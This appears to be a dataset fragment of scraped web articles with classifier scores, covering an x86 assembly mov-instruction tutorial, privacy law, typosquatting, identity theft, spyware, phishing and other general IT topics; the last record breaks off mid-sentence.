        "text": "I’m still following the Assembly Primer for Hackers from Vivek Ramachandran of SecurityTube in preparation for Penetration Testing with BackTrack. In this review I’ll cover data types and how to move bytes, numbers, pointers and strings between labels and registers. Variables (data/labels) are defined in the .data segment of your assembly program. Here are some of the available data types you’ll commonly use. Data types in assembly; photo credit to Vivek Ramachandran # Demo program to show how to use Data types and MOVx instructions .data HelloWorld: .ascii \"Hello World!\" ByteLocation: .byte 10 Int32: .int 2 Int16: .short 3 Float: .float 10.23 IntegerArray: .int 10,20,30,40,50 .bss .comm LargeBuffer, 10000 .text .globl _start _start: nop # Exit syscall to exit the program movl $1, %eax movl $0, %ebx int $0x80 Moving numbers in assembly Introduction to mov This is the mov family of operations. By appending b, w or l you can choose to move 8 bits, 16 bits or 32 bits of data. To demonstrate these operations, we’ll be using the example above. Moving a byte into a register movb $0, %al This will move the integer 0 into the lower 8 bits of the EAX register. Moving a word into a register movw $10, %ax This will move the integer 10 into the lower 16 bits of the EAX register. Moving a word into a register movl $20, %eax This will move the integer 20 into the 32-bit EAX register. Moving a word into a label movw $50, Int16 This will move the integer 50 into the 16-bit label Int16. Moving a label into a register movl Int32, %eax This will move the contents of the Int32 label into the 32-bit EAX register. Moving a register into a label movb %al, ByteLocation This will move the contents of the 8-bit AL register into the 8-bit ByteLocation label. Accessing memory locations (using pointers) In C we have the concept of pointers. A pointer is simply a variable that points to a location in memory. Typically that memory location holds some data that is important to us and that’s why we’re keeping a pointer to it so we can access the data later. This same concept can be achieved in assembly. Moving a label’s memory address into a register (creating a pointer) movl $Int32, %eax This will move the memory location of the Int32 label into the EAX register. In effect the EAX register is now a pointer to the data held by the Int32 label. Notice that we use movl because memory locations are 4 bytes. Also notice that to access the memory location of a label you prepend the $ character. Dereferencing a pointer (accessing the contents of a memory address) Moving a word into a dereferenced location movl $9, (%eax) This will move the integer 9 into the memory location held in EAX. In other words, if this were C, %eax would be considered a pointer and (%eax) would be the way we dereference that pointer to change the contents of the location it points to. The equivalent in C would like something like this: int Int32 = 2; int *eax; eax = &Int32; *eax = 9; The only difference in the C example is that we had to define eax as an int pointer before we could copy the address of Int32. In assembly we can just copy the address of Int32 directly into the EAX register, circumventing the need for an additional variable. But line 4 of this C example is the equivalent of the assembly example shown above. So to clarify one more time, EAX does not change at all in this example; EAX still points to the same location! However, the data at that location has changed. So if EAX contains the location of the Int32 label, then Int32 now contains 9. So it’s Int32 that has changed, not EAX. Notice that we use the parentheses to access the memory location stored in the register (dereference the pointer). Moving a dereferenced value into a register movl (%eax), %ebx In effect the EBX register is now a pointer to the data held by EAX. Notice that to access the memory location of the register we’re again enclosing the register name in parentheses. Moving strings in assembly I can imagine that reading this you might be thinking, “hey, strings are just bytes of data so why can’t I just move them using the same instructions I just learned?” And the answers to that questions is you can! The problem is that strings are oftentimes much larger. A string might be 1 byte, 5 bytes, or 100 bytes. And none of mov instructions discussed above cover anything larger than 4 bytes. So let’s discuss the string operations that are available to alleviate the pains of copying large strings of data. A key difference between the standard mov operations and the string series of movs, stos and lods operations is the number of operands. With mov, you specify the source and destination via 2 operands. However, with the movs instructions, the source and destination addresses are placed into the ESI and EDI registers respectively. And with stos and lods, the operations interact directly with the EAX register. This will become more clear with some examples. The DF flag DF stands for direction flag. This is a flag stored in the CPU that determines whether to increment or decrement a string’s memory address when string operations are called. When DF is 0 (cleared) the addresses are incremented. When DF is 1 (set) the addresses are decremented. In our examples the DF flag will always be cleared. The usefulness of the DF flag will make more sense in the examples. Clearing the DF flag DF is set to 0. Addresses are incremented where applicable. Setting the DF flag DF is set to 1. Addresses are decremented where applicable. In the example below, the following variables have been defined: .data HelloWorldString: .asciz \"Hello World of Assembly!\" .bss .lcomm Destination, 100 movs: Moving a string from one memory location to another memory location source: %esi; should contain a memory address where the data to be copied resides; the data at this address is not modified, but the address stored in the %esi register is incremented or decremented according to the DF flag destination: %edi; should contain a memory address where the data will be copied to; after copying, the address stored in the %edi register is incremented or decremented according to the DF flag movsb: move a single byte movsw: move 2 bytes movsl: move 4 bytes movl $HelloWorldString, %esi movl $Destination, %edi movsb movsw movsl In this example, we first move the address of HelloWorldString into the ESI register (the source string). Then we move the address of Destination into EDI (the destination buffer). When movsb is called, it tells the CPU to move 1 byte from the source to the destination, so the ‘H’ is copied to the first byte in the Destination label. However, that is not the only thing that happens during this operation. You may have noticed that I pointed out how the address stored in the %esi and %edi registers are both incremented or decremented according to the DF flag. Since the DF flag is cleared, both %esi and %edi are incremented by 1 byte. But why is this useful? Well, what it means is that the next string operation to be called will start copying from the 2nd byte of the source string instead of the first byte. In other words, rather than copying the ‘H’ a second time, we’ll start by copying the ‘e’ in the HelloWorldString instead. This is what makes the movs series of operations far more useful than the mov operations when dealing with strings. So, as you might imagine, when calling movsw the next 2 bytes are copied and Destination now holds “Hel”. And finally the movsl operation copies 4 bytes into Destination, which makes it “Hello W”. Of course, the memory locations held in both %esi and %edi have now been incremented by 7 bytes each. So the final values are.. %esi: $HelloWorldString+7 %edi: $Destination+7 HelloWorldString: \"Hello World of Assembly!\" Destination: \"Hello W\" lods: Moving a string from a memory location into the EAX register source: %esi; should contain a memory address where the data to be copied resides; the data at this address is not modified, but the address stored in the %esi register is incremented or decremented according to the DF flag destination: %eax; the contents of this register are discarded because the data is copied directly into the register, NOT to any memory address residing in the register; no incrementing or decrementing occurs because the destination is a register and not a memory location lodsb: move a single byte lodsw: move 2 bytes lodsl: move 4 bytes stos: Moving a string from the EAX register to a memory location source: %eax; the contents of this register are copied, NOT the contents of any memory address residing in the register; no incrementing or decrementing occurs because the source is a register and not a memory location destination: %edi; should contain a memory address where the data will be copied to; after copying, the address stored in the %edi register is incremented or decremented according to the DF flag stosb: move a single byte stosw: move 2 bytes stosl: move 4 bytes rep: Repeating an operation so you can move strings more easily This will continue executing the movsb operation and decrementing the ECX register until it equals 0. So if you wanted to copy a string in its entirety, you could follow this pseudo-code: * set ESI to the memory address of the source string * set EDI to the memory address of the destination string * set ECX to the length of the source string * clear the DF flag so ESI and EDI will be incremented for each call to movsb * call rep movsb movl $HelloWorldString, %esi movl $DestinationUsingRep, %edi movl $25, %ecx # because HelloWorldString contains 24 characters + a null terminator cld rep movsb Here we have movsb being called 25 times (the value of ECX). Because movsb increments both the ESI and EDI register you don’t have to concern yourself with the memory handling at all. So at the end of the example, the values are.. %esi: $HelloWorldString+25 %edi: $Destination+25 %ecx: 0 DF: 0 HelloWorldString: \"Hello World of Assembly!\" Destination: \"Hello World of Assembly!\" More to Come I hope you enjoyed reviewing data types and mov operations. Stay tuned for more assembly tips!",
        "prob": "tensor([[2.6344e-05, 9.9997e-01]])"
    },
    {
        "text": "(ARA) - Traditionally, the term “war zone” elicits images of tanks, gunfire and military personnel. However, as technology evolves, so do the weapons associated with the art of warfare. Most recently, the battleground has moved online, with the introduction of a new computer malware threat known as “Flame.” Flame steals information from e-operations of certain nation states – making it a vital threat to both governments and military units. Based on the way Flame works, it can be classified as a “cyber weapon,” according to Kaspersky Lab, a Russian anti-virus firm. Web attacks cost businesses $114 billion each year, according to a 2011 study conducted by Symantec. And as more business, government and military institutions store classified information online, the probability of an attempted attack by these new forms of cyber-weaponry increases. Given the likelihood for future security breaches, the need for professionals with the skills required to protect those at risk for such forms of online espionage is amplifying. The U.S. Bureau of Labor Statistics Occupational Outlook Handbook reports that by the year 2020, demand for cyber security experts will increase by 28 percent. Much like the way the military and police serve and protect our country and its citizens, cyber security experts play a crucial role in protecting an institution’s network and information from attacks. These professionals, known as computer forensics experts, also analyze the electronic evidence, and in some cases identify and serve as expert witnesses to help prosecute the criminals responsible. Bachelor’s degree programs such as computer information systems (CIS) help prepare students for this role. Many programs allow students to concentrate their studies in a variety of cyber security specialties. For example, students focusing on computer forensics will learn the skills necessary to handle the electronic evidence of criminal cases and how to identify and prosecute criminals. At DeVry University, students enrolled in the Computer Information Systems bachelor’s degree program can pursue a cyber security specialization in computer forensics that allows them to gain understanding of the diversity of computer crime, and the laws and principals concerned with computer forensics and electronic evidence. They also learn how to discover data that resides in a computer system, and how to recover deleted, encrypted or damaged file information. “Technical knowledge is only one piece of the skillset puzzle for cyber security practitioners,” says Dr. Ahmed Naumaan, national dean for the College of Engineering & Information Sciences at DeVry University. “Creativity and the ability to think outside the box play a pertinent role, as those in this field must be able to take on the mindset of the hackers they protect against.” The many forms of online assault will continue to evolve. As governments, businesses and other institutions increasingly become targets of online warfare, the demand for those armed with the competencies to successfully defend against them will grow.",
        "prob": "tensor([[2.0332e-06, 1.0000e+00]])"
    },
    {
        "text": "Invasion of Privacy The right of privacy is a common-law (court-made) cause of action that is a fairly new legal development. The U.S. Constitution contains no direct references to the right of privacy. There are few statutes that affect privacy and most invasion of privacy lawsuits that publishers may face are of the common-law type. An action for invasion of privacy is actually comprised of four distinct torts (legal wrongs). These are: intrusion upon seclusion; appropriation of name or likeness; publicity given to private life; and publicity placing the person in a false light. Each separate cause of action is addressed below. Note: to sue successfully for invasion of privacy, a plaintiff only has to prove one of the four torts, not all of the four torts. The right of privacy competes with the freedom of the press as well as the interest of the public in the free dissemination of news and information, and these permanent public interests must be considered when placing the necessary limitations upon the right of privacy. Pennsylvania courts have held that an action based on such right must not become a vehicle for establishment of a judicial censorship of the press. Back to top. Intrusion Upon Seclusion One who intentionally intrudes, physically or otherwise, upon the solitude or seclusion of another or his private affairs or concerns, is subject to liability to the other for invasion of his privacy, if the intrusion would be highly offensive to a reasonable person. To be liable for intrusion upon seclusion, the plaintiff must prove the following elements: 1. Invasion of a secluded place or privacy: the Defendant (the offender) must invade the Plaintiff's (the person suing) personal or private space. The definition of this invasion is very broad. Invasion may be: by physical intrusion into a place where the plaintiff has secluded himself. by use of the defendant's senses to oversee or overhear the plaintiff's private affairs (such as eavesdropping or spying with a telescope), or some other form of investigation or examination into plaintiff's private concerns (such as illegally obtaining someone's credit report). 2. Objectionable intrusion: the intrusion must be of a type that would be highly offensive to the ordinary reasonable person. 3. Invasion of private affairs or matters: the interference with the plaintiff's privacy must be substantial (however, if the event reported occurs in public, there is no expectation of privacy). Examples of intrusion upon privacy include placing microphones or cameras in someone's bedroom or hacking into their computer. However, where the information that is reported pertains to the public interest as well as a party's private interest, that individual's right of privacy will be weighed against the public interest. If the event being reported is in the public interest (a newsworthy event), it will, in all likelihood, be immune to an invasion of privacy lawsuit. An example of this would be a car accident. Although it involves the personal affairs of a few people (or even only one person), the accident is reportable because it is a newsworthy event. Therefore, a person cannot sue a newspaper for invasion of privacy over a story about a car accident that includes the driver's name. Photographs taken in public are also not violative of one's privacy. Back to top. Appropriation of Name or Likeness Appropriation of name or likeness occurs when someone appropriates the name or likeness of another for their own use or benefit. Action for misappropriation of right of publicity protects against commercial loss caused by appropriation of an individual's personality for commercial exploitation. It gives the individual exclusive right to control the commercial value of his or her name and likeness to prevent others from exploiting that value without permission. It is similar to a trademark action with the person's likeness, rather than the trademark, being the subject of the protection. Courts have denied plaintiffs lawsuits unless there is a finding that the defendant obtains an economic benefit from using the plaintiff's name. Additionally, the courts are unlikely to find that there has been an appropriation of the plaintiff's likeness unless the unauthorized use was part of an advertisement or a promotion. If such an appropriation is for a newsworthy event, the person's right to privacy is not violated. An example of this is if a photograph of someone patronizing a new restaurant is published as part of a story publicizing the opening of the restaurant. The patron cannot sue the newspaper for appropriation of name or likeness because the photograph is being used for a newsworthy event. However, if a store is using someone's picture to advertise a new line of clothes, and they have not received permission from that person to use the picture, that person's likeness has been wrongly appropriated. Back to top. Publicity Given to Private Life One who gives publicity to a matter concerning the private life of another is subject to liability to the other for invasion of his privacy, if the matter publicized is of a kind that: 1. would be highly offensive to a reasonable person, and 2. is not of legitimate concern to the public. The main determination in a publicity given to private life lawsuit is whether the matter being publicized is public or private. If the matter is one of public concern, there is no invasion of privacy. First Amendment rights protect the publication of items of legitimate public interest. However, if the matter is not one of public concern, and it is one that people would find offensive, there is an invasion of privacy. An example of publicity given to private life would be publicizing the fact that your neighbor has failed to pay his credit card bill for three months. Sometimes there is difficulty in determining whether something really is of legitimate public concern. Courts have held that a claim that a person violated the law is relevant and newsworthy, even though it was latter proven that the substance of the complaint was false. The example of a drunk-driving one-car accident is also illustrates this point. Although the driver may have an interest in keeping the fact that he was driving while intoxicated private, the accident occurred in public and is a newsworthy event. The public's interest in knowing about the accident outweighs the driver's interest in keeping the accident private. Additionally, matters that are of public record are not protected. If a journalist publishes a story disclosing facts that were obtained from a police press release or a court opinion, the matter is of public record and no lawsuit for publicity given to private life will be successful. Public figures (those persons who, by their accomplishments or place in life, give the public a legitimate interest in their affairs, such as politicians, professional athletes, and even personal injury claimants) face a somewhat lessened right to privacy because more of their actions are of legitimate public concern than they would be if the public figure were an ordinary person. Because of this lessened expectancy of privacy, a newspaper can publish a biography of a public figure without fear of being sued for invasion of privacy. No permission is needed to do such a story. Additionally, the newspaper can include some facts that would otherwise be an invasion of privacy for a person who is not a public figure. Care must be taken that these otherwise private facts are within the scope of the story. Examples of these facts would be a public figure's familial background, associates, or specific events in their life that shape them into the person that they are, or that shed light as to their guilt or innocence. Public figures (those persons who, by their accomplishments or place in life, give the public a legitimate interest in their affairs, such as politicians, professional athletes, and even personal injury claimants) face a somewhat lessened right to privacy because more of their actions are of legitimate public concern than they would be if the public figure were an ordinary person. Because of this lessened expectancy of privacy, a newspaper can publish a biography of a public figure without fear of being sued for invasion of privacy. No permission is needed to do such a story. Additionally, the newspaper can include some facts that would otherwise be an invasion of privacy for a person who is not a public figure. Care must be taken that these otherwise private facts are within the scope of the story. Examples of these facts would be a public figure's familial background, associates, or specific events in their life that shape them into the person that they are, or that shed light as to their guilt or innocence. Back to top. Publicity Placing the Person in a False Light One who gives publicity to a matter concerning another that places the other before the public in a false light is subject to liability to the other for invasion of his privacy if the false light in which the other was placed would be highly offensive to a reasonable person. Examples include a newspaper publishing an innocent person's picture as part of a story about convicted felons or including reporting that someone was involved in a domestic dispute when, in fact, there was no such dispute. Publicly placing a person in a false light also includes falsely stating someone's views, such as saying that someone is a member of the Ku Klux Klan. An important exception is when the published matter is in the public interest (newsworthy), such as an item dealing with an accident or the background of a candidate for public office. When the published matter is in the public interest, the plaintiff must show that the publisher acted with malice (that they either had a reckless disregard for the truth or they knew the report was false but published it anyway). For example, if a newspaper published a story reporting that a candidate for mayor embezzled money from his previous employer, but never attempted to verify the accuracy of the information, the newspaper can be held liable for publicly placing the candidate in a false light. It is important to keep in mind that malice can be found if the information published is without probable cause or the newspaper never checked for truth by the means at hand. For more information about malice, see:Libel Back to top. Special Notes on Invasion of Privacy For a successful lawsuit, the plaintiff must prove that the defendant's actions caused his or her privacy to be invaded. Therefore, the newspaper cannot be sued for invasion of privacy if a newspaper publishes a story based upon a report that was made by someone who invaded the plaintiff's privacy. Note: the newspaper may be held responsible if the newspaper encourages someone to invade the plaintiff's privacy. Additionally, in some invasion of privacy cases, the newspaper may also be held liable for libel. Unlike libel, truth is not a defense for invasion of privacy. Only the plaintiff holds the right to privacy. It is a personal right. It does not survive the plaintiff (the defendant cannot be sued for invasion of privacy actions that occur after the death of the person whose privacy was invaded), nor can it be asserted on behalf of family members. Invasion of privacy lawsuits cannot be brought by, or on behalf of, corporations. Successful plaintiffs may recover damages for harm to their interest in privacy, mental/emotional distress, and special damages caused by the invasion of privacy. Back to top.",
        "prob": "tensor([[0.0796, 0.9204]])"
    },
    {
        "text": "Four years ago, LAMP (Linux OS, Apache Web server, MySQL database and Perl, Python and PHP languages) was the open stack of choice, especially for Web servers. In the early part of the decade, when MySQL started promoting LAMP to boost its own visibility as the M in the stack, the acronym grew in popularity. Today, however, LAMP is like an illuminated sign with only the A still visible. While the existence of an all-open source application stack remains helpful, there are so many choices beyond the original group that the LAMP acronym has fallen into disuse, analysts say. Even Linux is not sacrosanct, with companies occasionally substituting Windows in an otherwise all-open source stack; the Apache Web server is the only LAMP component whose position remains undisputed, observers say. \"It's never been a specific acronym,\" said Mark Driver, at research vice president at Stamford, Conn.-based Gartner Inc.. \"LAMP always represented the idea of an open stack. It shouldn't be taken too literally.\" Anne Thomas Manes, vice president and research director of Midvale, Utah-based Burton Group, agreed. \"LAMP stands for completely open source,\" she said. \"And it's simpler, lighter-weight programming than Java or .NET, and it's nice for Web sites.\" Indeed, with the P, LAMP's clarity began eroding. Initially, the P stood for Perl, the most popular language for creating Web pages. But it was later joined by PHP, which is easier to write because the program runs inside Web pages rather than on a server. Though PHP has in turn has created an \"epidemic of security issues,\" according to Ed Sawicki, a veteran IT consultant based in Portland, Ore. Now Python is more popular, but programmers use Ruby and LISP, he said. As for databases, MySQL may be the most popular open source choice, with simplicity and speed in its favor, Sawicki said. Still, Postgres is better at more complex functions; so some companies use both databases, he said. The Ruby language on the Rails framework is generally safer than PHP and Python, whereas Python is more complex, and typically used by programmers who are aware of potential security pitfalls, she said. \"The beauty of LAMP is that it's an a la carte technology,\" added Driver. \"And it's light years ahead of where it was two years ago.\"",
        "prob": "tensor([[1.2148e-04, 9.9988e-01]])"
    },
    {
        "text": "- Why are these threats possible? Because computers are little more than tools. The term \"computer\" is very descriptive despite all of the abstraction that we attempt to layer on top of them; it is a device that \"computes\", plain and simple. Whether, at any given nanosecond, it is computing the color of a pixel in a UI, the address of data in its memory, etc, it is no more or less than an incredibly fast binary calculator hooked up to a lot of peripheral components that provide inputs to and outputs from the basic programming the CPU is currently churning its way through. Given that, the question of \"why\" has a simple answer; tools can be used for good or ill. Hammers can pound nails or skulls. Saws can cut wood or flesh. And computers can sequence DNA to find the cure for cancer, or steal your bank account information. - Why doesn't the computer just do the things it is supposed to? It does. It does exactly what it is told to do by the program that it is currently executing. The problem is that the program the computer is currently executing isn't necessarily something you told it to execute explicitly by the stroke of a key or the click of a mouse. For a very long time now, we've used multiple layers of software (and hardware) to allow for modularity; any computer can have any hardware plugged into it, and run any program to work with it (at least that's the theory). More recently we have invented layers to allow a computer to juggle many programs at once. These layers of abstraction such as the OS, virtual machines, daemons (services), etc, which hide what the computer is really doing on any given clock, can be manipulated by an attacker to run software without your conscious knowledge. - Why do some people write malware, instead of programs with a constructive purpose beyond doing damage and violating the law? ...some men aren't looking for anything logical, like money. They can't be bought, bullied, reasoned, or negotiated with. Some men just want to watch the world burn. - Alfred Pennyworth, The Dark Knight For most \"black hats\", the mayhem they cause is fun, it's entertaining, the same way you or I would enjoy a video game in a completely sandboxed environment. They, however, are doing things in the real world. Same layer of digital separation between you and the consequences of your actions, with the added thrill of knowing it's real. - Does computer insecurity exist because of the nature of computers? To a point, yes. Computers are powerful, but they are extremely dumb. They require humans to do their thinking for them, to design them in a way that is difficult to subvert, to program them in a way that is difficult to subvert, and to use them in a way that is difficult to subvert. The inherent difficulty of this is similar to the inherent difficulty (maybe the impossibility) of designing a \"completely foolproof system\": A common mistake that people make when trying to design something completely foolproof is to underestimate the ingenuity of complete fools. - Douglas Adams In both cases, you're very simply trying to pre-emptively outsmart someone willing to spend a lot of time and effort finding a way to misuse what you're designing once the finished product has left your hands. You effectively have to come up with the same ideas that the other person would have, and incorporate mechanisms to defeat that line of thinking. The more complex the system is internally, the more of those ideas become possible, and the less likely you are to have thought of everything. The more you put in place to prevent misuse, the more complexity you add. It's a vicious cycle.",
        "prob": "tensor([[0.0021, 0.9979]])"
    },
    {
        "text": "How many times have you typed a wrong internet address into your web browser? It must have happened to you at least once. Maybe instead of “Facebook” you typed “Fcebook” while rushing to access your Facebook profile? You’d think that such an honest mistake doesn’t cost you anything. After all, you do no harm. But with all the cybercriminals out there looking for new opportunities to make some easy money, mistyping the name of a popular website might cost you your internet security. If you mistype the address of a website into your browser, you could end up on a malicious website. Once landed, you might get tricked into downloading malicious software to your computer or handing over personal information, such as credit card details. Cybercriminals set up these fake websites, hoping to “capitalize” on your mistakes. What is typosquatting? The fraudulent web practice mentioned above is called “typosquatting”. It is a form of cybersquatting, an illegal web practice also known as “domain” or “URL squatting”. The US and other countries even have a law against it. In the US it’s called “the Anticybersquatting Consumer Protection Act”. Cybersquatting basically refers to the action of registering, trafficking in, or using the name of an existing website to profit from the goodwill of a trademark that belongs to someone else. Sometimes, the ill-intended third-parties behind this kind of fraud – cybersquatters – register misspelled versions of popular trademarked names that coincide with common misspellings made by web users. In such cases, if you happen to type one of those versions into your browser, you’re directed to their site (for example: www.example.com may be used as www.exmple.com). At this point, your internet security might be greatly compromised. This is typosquatting and has happened with popular brands like: Twitter – www.twtter.com, Wikipedia – www.wikapedia.com, Craiglist – www.craigilist.com, Apple – www.pple.com, Google – www.goole.com and more. What do typosquatters want? - Compete with the popular sites in question for web traffic and earn money through advertisements; in this case, typosquatters are not putting at risk your internet security, but they are taking advantage of your good faith. Their real victims are the companies whose names are used as bait. - Trick you into downloading spyware or other type of malware to your computer. If you don’t have proper antivirus protection, they might breach your internet security. For example, once you get on the respective site, a pop-up window might warn you that your computer is infected and urge you to download an antivirus program they provide. If you fall for the scam, what you actually download is malware. - Get hold of your personal information – usernames, passwords, credit card details, as part of a phishing scam. The site you land on might offer you fake discounts or giveways, in exchange for your personal details. - Direct you to adult, dating sites, or other sites you had no intention of visiting. How to avoid typosquatting dangers: - Be very careful with what you type in to your web browser. Always type in the correct names of the sites you want to visit and make sure your kids do the same. You don’t want them ending up on dating sites or downloading some form of malware that can compromise your entire family’s internet security. - When you’re not sure of the correct spelling of the website name, do not type it in the browser address bar directly. Use a trusted search engine instead, like Google, Bing and Yahoo!, to get a thorough list of search results. In this case, it’s best you have an effective Safe Browsing tool, like the one in BullGuard Internet Security 12, to flag out phishing, virus-infected and other types of malicious websites. - Get a genuine and comprehensive internet security suite to protect you from phishing attempts, viruses, spyware and other types of malware. BullGuard’s internet security software comes with a dual antivirus engine that spots known and yet unknown malware, as well as an antiphishing tool and a bunch of other cool internet security features.",
        "prob": "tensor([[2.3963e-06, 1.0000e+00]])"
    },
    {
        "text": "An Introduction to ASP.NET Web API Microsoft recently released the ASP.NET MVC 4.0 beta and along with it, the brand spanking new ASP.NET Web API. Web API is an exciting new addition to the ASP.NET stack that provides a new, well-designed HTTP framework for creating REST and AJAX APIs (API is Microsoft’s new jargon for a service, in case you’re wondering). Although Web API currently ships and installs with ASP.NET MVC 4, you can use Web API functionality in any ASP.NET project, including WebForms, WebPages and MVC or none of the above. You can also self-host Web API in your own applications. Please note that this article is based on pre-release bits of ASP.NET Web API (pre-RC) and the API is still changing. The samples are built against the latest snapshot of the CodePlex ASP.NET Web Stack Source and some of the syntax and functions might change by the time Web API releases. Overall concepts apply, and I’ve been told that functionality is mostly feature complete, but things are still changing as I write this. Please refer to the latest code samples on GitHub for the final syntax of the examples. What’s a Web API and Why Do We Need It? Most mobile devices, like phones and tablets, run apps that use data retrieved from the Web over HTTP. The .NET stack already includes a number of tools that provide the ability to create HTTP service backends. There’s WCF REST for REST and AJAX, ASP.NET AJAX Services purely for AJAX and JSON, and you can always use plain HTTP Handlers for any sort of response but with minimal plumbing. You can also use plain MVC Controller Methods or even ASP.NET WebForms pages to generate arbitrary HTTP output. Although all of these can accomplish the task of returning HTTP responses, none of them are optimized for the repeated tasks that an HTTP service has to deal with. If you are building sophisticated Web APIs on top of these solutions, you’re likely to either repeat a lot of code or write significant plumbing code yourself to handle various API requirements consistently across requests. A Better HTTP Experience ASP.NET Web API differentiates itself from these other solutions in that it was built from the ground up around the HTTP protocol and its messaging semantics. Unlike WCF REST or ASP.NET AJAX with ASMX, it’s a brand new platform rather than bolted-on technology that is supposed to work in the context of an existing framework. Web API is meant to handle any kind of HTTP input and produce output and status codes using the full spectrum of HTTP functionality available. There’s much-improved support for content negotiation based on HTTP Accept headers, with the framework capable of detecting content that the client sends and requests and automatically serving the appropriate data format in return. Many of the features favor convention over configuration, making it much easier to do the right thing without having to explicitly configure specific functionality. Although previous solutions accomplished this using a variety of WCF and ASP.NET features, Web API combines all this functionality into a single server-side HTTP framework that intrinsically understands the HTTP semantics and subtly drives you in the right direction for most operations. And when you need to customize or do something that isn’t automatic, there are overrides for most behaviors, and even many low-level hook points that allow you to plug-in custom functionality with relatively little effort. ASP.NET Web API differentiates itself from existing Microsoft solutions in that it was built from the ground up around the HTTP protocol and its messaging semantics. Web API also requires very little in the way of configuration so it’s very quick and unambiguous to get started. To top it all off, you can also host the Web API in your own applications or services. - Above all, Web API makes it extremely easy to create arbitrary HTTP endpoints in an application without the overhead of a full framework like WebForms or ASP.NET MVC. Because Web API works on top of the core ASP.NET stack, you can plug Web APIs into any ASP.NET application. By: Rick Strahl Rick Strahl is president of West Wind Technologies in Maui, Hawaii. The company specializes in Web and distributed application development and tools, with focus on Windows Server Products, .NET, Visual Studio, and Visual FoxPro. Rick is the author of West Wind Web Connection, West Wind Web Store, and West Wind HTML Help Builder. He’s also a C# MVP, a frequent contributor to magazines and books, a frequent speaker at international developer conferences, and the co-publisher of CoDe Magazine. For more information please visit his Web site at www.west-wind.com or contact Rick at firstname.lastname@example.org.",
        "prob": "tensor([[3.4388e-06, 1.0000e+00]])"
    },
    {
        "text": "Identity theft occurs more frequently in the United States than people want to believe. According to the U.S. Department of Justice, identity theft and identity fraud are referred to as \"all types of crime in which someone wrongfully obtains and uses another person's personal data in some way that involves fraud or deception for economic gain.\" The Federal Trade Commission compiles a report every year for identity theft complaints in the United States. These complaints increased more than 78 percent between 2009 and 2011. With identity theft becoming an increasing problem, Professor Duanne J. Thompson, the acting program chair of Criminal Justice at Argosy University, Atlanta, offers some advice for consumers to take in order to protect themselves from identity theft: 1. Protect your identity like you would protect your house. 2. Don't give out sensitive information such as Social Security information. In most states it is illegal for a business to ask for your Social Security number for transactions. 3. If purchasing on the Web, make sure you know who you are buying from and that the site is secure. 4. Don't fall for phishing scams. Legitimate websites will never ask for your password or account information. If in doubt contact the vendor before you send your information. Thompson also says that consumers should be aware that they have a right to have one free credit report from every credit clearing house, such as Equifax, TransUnion and Experian, at least once a year. In some states, consumers are allowed a free credit report at least twice a year. Consumers should look at the information from their reports and ensure that the information is correct and accurate. They should look specifically at each credit statement every month for suspicious fraudulent activity. The bigger question is what a consumer should do if they find themselves victims of identity theft. Thompson suggests to first notify your credit vendor that your card has been compromised and that there is an individual acting as you. Consumers should then call their local police department and file a report. Afterward, gather as much information as possible about your accounts and all transactions to help aid the investigator in the case. Once the police report is obtained, file an identity theft claim with all three credit clearing houses (Equifax, TransUnion and Experian). All three credit clearing houses will require a copy of the local police report and all the information you have supporting the theft. With the rise of online trends such as social media and online banking, consumers must be more vigilant about their identity as these trends lead to more and more avenues for identity theft criminals. The best way a consumer can protect their identity to simply be smart and be aware of their financial records. GateHouse News Service",
        "prob": "tensor([[2.0943e-06, 1.0000e+00]])"
    },
    {
        "text": "An individual who uses a computer with an Internet connection pretty much practices caution when downloading programs from the Internet and email because of the threat of viruses and worms. These malicious program codes and programs can cause your system to become unstable and worse yet, after it has spread within your system, it further infects other systems connected to yours. This is why any sensible computer user has anti virus programs installed in one’s computer for protection against attacks from viruses and worms that proliferate the Internet. The good thing about viruses and worms is the fact that it is easier to spot them trying to get into your system. For instance, a virus or worm can try to enter your system through a suspicious attachment usually from an unknown source. By now, most Internet users know better than to open suspicious attachments. Also, rigorous anti virus programs can scan attachments before you can open them so that your risk against viruses and worms are properly managed. However, as an Internet user, you have more to worry about than viruses and worms. Unfortunately, anti virus programs are not designed to detect other types of threats and if you are not careful, you may unwittingly install adware and spyware into your system and once this happens, uninstalling these programs can become problematic. For one thing, most spyware can go undetected in your system. You will continue on your regular computer and Internet habits without realizing that your privacy is immensely violated and your security is greatly hindered. Since spyware can go undetected and you can continue to use your computer and the Internet as usual, there is no need to worry about uninstalling spyware, right? Spyware in mild cases infringes on your privacy because it can track and take note of your usage patterns and these information are reported back to the company that created the spyware so that they can build marketing profiles. More than that though, some spyware have the ability to register and take note of key strokes, scan documents within your computer‘s hard drive, and can steal your passwords and other sensitive information that can make you the victim of identity theft and other situations where your personal information can be used to compromise your security. On the other hand, adware is used by companies to infect your computer with unsolicited ads. The most problematic kinds are the ones that indiscriminately pop ads on to your screen even if you are not viewing their site or using the parent program that launched the adware. In fact, in some cases, adware continues to work into your system long after you uninstalled the program it came bundled with. Given the security risks, the invasion of your right to privacy, and the annoying effects of spyware and adware, you will be wise to uninstall these programs from your computer. However, to uninstall adware and spyware from your system is not such a simply task. For one thing, companies that proliferate the Internet with spyware and adware go to great lengths to ensure that uninstalling them from your system can be difficult. For instance, in most cases, you will be unable to use legitimate software if you attempt to uninstall the adware or spyware it comes bundled with. Adware and spyware are usually bundled with legitimate freeware or shareware and cannot run independently of each other.",
        "prob": "tensor([[2.0693e-06, 1.0000e+00]])"
    },
    {
        "text": "Phishing: The Basics Here's how to be on your guard against phishing attacks CSO — Phishing is a method of trying to gather personal information using deceptive e-mails and websites. Pharming also aims to collect personal information from unsuspecting victims by essentially tinkering with the road maps that computers use to navigate the Web. You don't want either one working its evil genius on you, your employees or your customers. Here's how to be on your guard against both phishing and pharming. Last updated: April 2009 - What is phishing? - Can we prevent phishing attacks? - What can my company do to reduce our chances of being targeted? - What plans should my company have in place before a phishing incident occurs? - How can we quickly find out if a phishing attack has been launched using our company's name? - How can we help our customers avoid falling for phishing? - If an attack does happen, how should we respond? - Any legal/regulatory requirements we should be aware of? - What action can we take against the phishers themselves? - How might phishing attacks evolve in the near future? (E.g. \"spear-phishing) - How can we guard against pharming attacks? Q: What is phishing? A: Phishing is a method of trying to gather personal information using deceptive e-mails and websites. Typically, a phisher sends an e-mail disguised as a legitimate business request. For example, the phisher may pass himself off as a real bank asking its customers to verify financial data. (So phishing is a form of \"social engineering\".) The e-mail is often forged so that it appears to come from a real e-mail address used for legitimate company business, and it usually includes a link to a website that looks exactly like the bank's website. However, the site is bogus, and when the victim types in passwords or other sensitive information, that data is captured by the phisher. The information may be used to commit various forms of fraud and identity theft, ranging from compromising a single 